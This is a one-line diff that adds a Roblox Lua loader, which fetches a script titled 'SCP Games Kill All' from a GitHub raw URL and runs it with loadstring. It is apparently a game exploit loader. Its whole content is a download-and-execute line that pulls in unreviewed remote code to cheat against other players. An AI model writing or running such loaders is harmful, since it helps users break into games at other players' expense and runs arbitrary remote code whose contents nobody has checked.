@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CosmoCircle/scripts/main/SCP%20Games%20Kill%20All",true))()
